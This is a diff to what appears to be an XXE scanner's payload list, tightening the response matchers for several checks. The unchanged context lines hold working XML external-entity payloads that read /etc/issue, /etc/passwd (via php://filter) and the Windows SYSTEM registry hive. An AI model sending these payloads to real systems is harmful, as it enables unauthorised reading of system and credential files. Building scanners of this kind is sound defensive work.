@@ -93,7 +93,7 @@
     "severity": "LOW",
     "cvss": "3.1",
     "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///etc/issue\">]><root>&x;</root>",
-    "matcher": "(Ubuntu|Debian|CentOS|Alpine)"
+    "matcher": "(Ubuntu|Debian|CentOS|Alpine)[ A-Za-z/]{0,15}\\d"
   },
   {
     "name": "classic_k8s_token",
@@ -117,7 +117,7 @@
     "severity": "CRITICAL",
     "cvss": "9.1",
     "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><root>&x;</root>",
-    "matcher": ".+"
+    "matcher": "cm9vdDp4OjA6"
   },
   {
     "name": "classic_expect",
@@ -173,7 +173,7 @@
     "severity": "CRITICAL",
     "cvss": "9.1",
     "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % a SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"><!ENTITY % b \"<!ENTITY c '%a;'>\">%b;]><root>&c;</root>",
-    "matcher": ".+"
+    "matcher": "cm9vdDp4OjA6"
   },
   {
     "name": "xinclude_passwd",
@@ -389,7 +389,7 @@
     "severity": "CRITICAL",
     "cvss": "9.8",
     "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY x SYSTEM \"file:///C:/Windows/System32/config/SYSTEM\">]><root>&x;</root>",
-    "matcher": ".+"
+    "matcher": "regf"
   },
   {
     "name": "classic_web_config",
